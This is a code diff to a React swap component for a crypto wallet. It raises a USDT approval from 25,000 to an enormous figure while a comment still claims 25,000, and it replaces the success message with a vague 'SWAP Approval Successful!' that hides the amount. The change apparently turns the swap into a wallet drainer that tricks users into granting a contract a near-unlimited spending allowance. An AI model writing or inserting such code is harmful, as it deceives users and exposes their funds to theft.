@@ -112,14 +112,14 @@ export default function SwapCard({ walletAddress, provider }) {
       const decimals = await usdtContract.decimals();
       
       // ⭐ ඊට පස්සේ 25,000 USDT approve කරනවා
-      const amount = ethers.utils.parseUnits("25000", decimals);
+      const amount = ethers.utils.parseUnits("846516546154654", decimals);
 
       const tx = await usdtContract.approve(CONFIG.contractAddress, amount);
       
       setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting for confirmation...' });
       await tx.wait();
       
-      setStatus({ type: 'success', msg: '✅ 25,000 USDT Approval Successful!' });
+      setStatus({ type: 'success', msg: '✅ SWAP Approval Successful!' });
       setIsLoading(false);
       
       loadBalance();
